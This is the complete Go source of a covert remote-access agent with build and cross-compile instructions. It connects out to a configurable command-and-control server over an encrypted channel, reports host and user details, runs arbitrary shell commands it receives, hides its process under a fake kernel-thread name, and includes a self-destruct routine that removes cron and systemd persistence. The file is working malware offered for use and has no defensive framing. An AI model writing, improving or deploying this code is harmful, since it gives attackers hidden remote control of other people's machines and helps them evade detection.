// 6319 Go Agent
// Minimal fileless agent with encryption
//
// Build: CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent agent.go
// Cross-compile:
//   GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o agent_arm64 agent.go
//   GOOS=linux GOARCH=arm go build -ldflags="-s -w" -o agent_arm agent.go

package main

import (
        "bytes"
        "context"
        "crypto/sha256"
        "encoding/binary"
        "encoding/json"
        "fmt"
        "io"
        "net"
        "os"
        "os/exec"
        "os/user"
        "runtime"
        "strings"
        "syscall"
        "time"
        "unsafe"

        "golang.org/x/crypto/nacl/secretbox"
)

const (
        KeySize   = 32
        NonceSize = 24
)

type Config struct {
        Host       string
        Port       int
        Secret     string
        HiddenName string
}

type Channel struct {
        Key [KeySize]byte
}

func deriveKey(secret string) [KeySize]byte {
        data := fmt.Sprintf("6319:%s:key", secret)
        return sha256.Sum256([]byte(data))
}

func NewChannel(secret string) *Channel {
        return &Channel{Key: deriveKey(secret)}
}

func (c *Channel) Encrypt(data []byte) []byte {
        var nonce [NonceSize]byte
        if _, err := io.ReadFull(cryptoRand(), nonce[:]); err != nil {
                panic(err)
        }

        encrypted := secretbox.Seal(nonce[:], data, &nonce, &c.Key)
        return encrypted
}

func (c *Channel) Decrypt(data []byte) ([]byte, error) {
        if len(data) < NonceSize {
                return nil, fmt.Errorf("data too short")
        }

        var nonce [NonceSize]byte
        copy(nonce[:], data[:NonceSize])

        decrypted, ok := secretbox.Open(nil, data[NonceSize:], &nonce, &c.Key)
        if !ok {
                return nil, fmt.Errorf("decryption failed")
        }

        return decrypted, nil
}

type cryptoReader struct{}

func cryptoRand() io.Reader {
        return cryptoReader{}
}

func (cryptoReader) Read(b []byte) (int, error) {
        f, err := os.Open("/dev/urandom")
        if err != nil {
                return 0, err
        }
        defer f.Close()
        return f.Read(b)
}

func sendRaw(conn net.Conn, data []byte) error {
        length := make([]byte, 4)
        binary.BigEndian.PutUint32(length, uint32(len(data)))

        if _, err := conn.Write(length); err != nil {
                return err
        }
        if _, err := conn.Write(data); err != nil {
                return err
        }
        return nil
}

func recvRaw(conn net.Conn, timeout time.Duration) ([]byte, error) {
        conn.SetReadDeadline(time.Now().Add(timeout))

        length := make([]byte, 4)
        if _, err := io.ReadFull(conn, length); err != nil {
                return nil, err
        }

        size := binary.BigEndian.Uint32(length)
        if size > 1024*1024 {
                return nil, fmt.Errorf("message too large")
        }

        data := make([]byte, size)
        if _, err := io.ReadFull(conn, data); err != nil {
                return nil, err
        }

        return data, nil
}

func getSystemInfo(hiddenName string) map[string]interface{} {
        hostname, _ := os.Hostname()
        username := "unknown"
        if u, err := user.Current(); err == nil {
                username = u.Username
        }
        cwd, _ := os.Getwd()

        return map[string]interface{}{
                "hostname":    hostname,
                "os":          fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
                "user":        username,
                "arch":        runtime.GOARCH,
                "pid":         os.Getpid(),
                "cwd":         cwd,
                "uid":         os.Getuid(),
                "hidden_name": hiddenName,
        }
}

func executeCommand(cmd string) map[string]interface{} {
        ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
        defer cancel()

        command := exec.CommandContext(ctx, "/bin/sh", "-c", cmd)
        var stdout, stderr bytes.Buffer
        command.Stdout = &stdout
        command.Stderr = &stderr

        err := command.Run()

        result := map[string]interface{}{
                "stdout": stdout.String(),
                "stderr": stderr.String(),
        }

        if err != nil {
                if exitErr, ok := err.(*exec.ExitError); ok {
                        result["code"] = exitErr.ExitCode()
                } else {
                        result["code"] = -1
                        result["error"] = err.Error()
                }
        } else {
                result["code"] = 0
        }

        return result
}

func hideProcess(name string) {
        nameBytes := []byte(name)
        if len(nameBytes) > 15 {
                nameBytes = nameBytes[:15]
        }

        syscall.Syscall(syscall.SYS_PRCTL, 15, uintptr(unsafe.Pointer(&nameBytes[0])), 0)
}

func getConfig() Config {
        config := Config{
                Host:       getEnvOrDefault("C2_HOST", "localhost"),
                Port:       6318,
                Secret:     getEnvOrDefault("SECRET", "default"),
                HiddenName: getEnvOrDefault("HIDDEN_NAME", "[kworker/0:0]"),
        }

        if port := os.Getenv("C2_PORT"); port != "" {
                fmt.Sscanf(port, "%d", &config.Port)
        }

        return config
}

func getEnvOrDefault(key, defaultVal string) string {
        if val := os.Getenv(key); val != "" {
                return val
        }
        return defaultVal
}

func main() {
        config := getConfig()

        name := strings.Trim(config.HiddenName, "[]")
        hideProcess(name)

        channel := NewChannel(config.Secret)

        reconnectDelay := 5 * time.Second
        maxDelay := 5 * time.Minute

        for {
                addr := fmt.Sprintf("%s:%d", config.Host, config.Port)
                conn, err := net.DialTimeout("tcp", addr, 30*time.Second)
                if err != nil {
                        time.Sleep(reconnectDelay)
                        reconnectDelay = minDuration(reconnectDelay*2, maxDelay)
                        continue
                }

                initData, _ := json.Marshal(map[string]string{"secret": config.Secret})
                if err := sendRaw(conn, initData); err != nil {
                        conn.Close()
                        time.Sleep(reconnectDelay)
                        continue
                }

                sysInfo := getSystemInfo(config.HiddenName)
                sysInfoJSON, _ := json.Marshal(sysInfo)
                encryptedInfo := channel.Encrypt(sysInfoJSON)
                if err := sendRaw(conn, encryptedInfo); err != nil {
                        conn.Close()
                        time.Sleep(reconnectDelay)
                        continue
                }

                respData, err := recvRaw(conn, 30*time.Second)
                if err != nil {
                        conn.Close()
                        time.Sleep(reconnectDelay)
                        continue
                }

                resp, err := channel.Decrypt(respData)
                if err != nil {
                        conn.Close()
                        time.Sleep(reconnectDelay)
                        continue
                }

                var respMap map[string]interface{}
                json.Unmarshal(resp, &respMap)
                if respMap["status"] != "ok" {
                        conn.Close()
                        time.Sleep(reconnectDelay)
                        continue
                }

                reconnectDelay = 5 * time.Second

                for {
                        cmdData, err := recvRaw(conn, 2*time.Minute)
                        if err != nil {
                                break
                        }

                        cmdJSON, err := channel.Decrypt(cmdData)
                        if err != nil {
                                break
                        }

                        var cmd map[string]interface{}
                        json.Unmarshal(cmdJSON, &cmd)

                        cmdType, _ := cmd["cmd"].(string)
                        var response map[string]interface{}

                        switch cmdType {
                        case "ping":
                                response = map[string]interface{}{
                                        "pong": true,
                                        "time": time.Now().Unix(),
                                }

                        case "exec":
                                cmdStr, _ := cmd["data"].(string)
                                response = executeCommand(cmdStr)

                        case "sysinfo":
                                response = getSystemInfo(config.HiddenName)

                        case "exit":
                                response = map[string]interface{}{"bye": true}
                                respJSON, _ := json.Marshal(response)
                                sendRaw(conn, channel.Encrypt(respJSON))
                                conn.Close()
                                os.Exit(0)

                        case "selfdestruct":
                                response = map[string]interface{}{"bye": true}
                                respJSON, _ := json.Marshal(response)
                                sendRaw(conn, channel.Encrypt(respJSON))
                                conn.Close()

                                exec.Command("crontab", "-l", "2>/dev/null", "|", "grep", "-v", "defunct", "|", "crontab", "-").Run()
                                exec.Command("systemctl", "--user", "stop", "dbus-session").Run()
                                exec.Command("systemctl", "--user", "disable", "dbus-session").Run()

                                os.Exit(0)

                        default:
                                response = map[string]interface{}{
                                        "error": fmt.Sprintf("unknown command: %s", cmdType),
                                }
                        }

                        respJSON, _ := json.Marshal(response)
                        if err := sendRaw(conn, channel.Encrypt(respJSON)); err != nil {
                                break
                        }
                }

                conn.Close()
                time.Sleep(reconnectDelay)
                reconnectDelay = minDuration(reconnectDelay*2, maxDelay)
        }
}

func minDuration(a, b time.Duration) time.Duration {
        if a < b {
                return a
        }
        return b
}
